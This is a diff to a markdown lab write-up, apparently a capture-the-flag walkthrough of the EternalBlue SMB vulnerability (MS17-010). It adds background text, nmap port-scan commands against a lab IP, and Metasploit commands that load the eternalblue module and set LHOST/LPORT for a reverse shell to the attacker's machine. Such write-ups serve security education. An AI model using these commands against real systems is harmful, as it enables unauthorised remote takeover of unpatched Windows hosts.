@@ -42,23 +42,21 @@ Summary:
 
 ## ¿What is EternalBlue?
 
-Etrnal Blue is an exploit that was allegedly developed by the U.S. National Security Agency (NSA).
-
+Eternal Blue is an exploit that was allegedly developed by the U.S. National Security Agency (NSA).
 This program was stolen and then leaked by "The Shadow Brokers". It was then used to execute one of the most damaging ransomware attacks in history, known as Wannacry.
-
 The eternal blue virus program was designed to exploit a vulnerability registered as *CVE-2017-0144*, which corresponds to a security flaw in Microsoft's Server Message Block protocol (SMB).
-
 The security patch for this eternal blue virus vulnerability, called *MS17-010*, was released in March 2017.
-
-The use of the eternalblue exploited mainly affected hospitals, police stations and, in general, organizations around the world.
+The use of the eternal blue exploited mainly affected hospitals, police stations and, in general, organizations around the world.
 
 [Versions with MS17-010](https://support.microsoft.com/es-es/topic/c%C3%B3mo-comprobar-que-ms17-010-est%C3%A1-instalado-f55d3f13-7a9c-688c-260b-477d0ec9f2c8)
-
 [CVE Versions](https://success.trendmicro.com/en-US/solution/KA-0008859)
 
 &nbsp;
 
 ## Port Scan - Reconnaissance
+
+Lets start with the reconnaissance phase.
+Our IP is *10.8.42.68 and* the target is *10.10.90.82*
 
 ```powershell
 ping -c 1 10.10.90.82
@@ -76,13 +74,57 @@ sudo su
 nmap 10.10.90.82 -p- -sV -oN all_ports.nmap -Pn --min-rate 5000
 ```
 
+ó
+
 ```powershell
 sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.90.82 -oG Escaneo
 ```
 
+Output:
+
+![EscaneoBlue.png](https://i.postimg.cc/XYTQptyK/scanblue.png)
+
+The 445/tcp for microsoft-ds Windows 7 port is open, this is the port that the vulnerability is going to be exploited.
+
 &nbsp;
 
-> Se que todo esto es bastante simple y me explicación no fue la mejor pero intento detallar lo mas claro posible..
+## Vulnerability Exploitation
+
+```powershell
+msfconsole
+
+> search ms17-010
+
+or 
+
+> search eternalblue
+
+> use exploit/windows/smb/ms17_010_eternalblue
+
+or 
+
+> use 0
+
+> show options
+```
+
+![showoptions](https://i.postimg.cc/k5TQX1FP/shwop.png)
+
+```powershell
+> set RHOSTS 10.10.90.82
+> set LPORT 65000
+> set LHOST 10.8.42.68
+
+> run
+```
+
+![runBlue](https://i.postimg.cc/wBGz4Cn3/bluaat.png)
+
+![blueHelp](https://i.postimg.cc/L88rdytP/bluehlp.png)
+
+```powershell
+> search ms17-010
+```
 
 ---
 
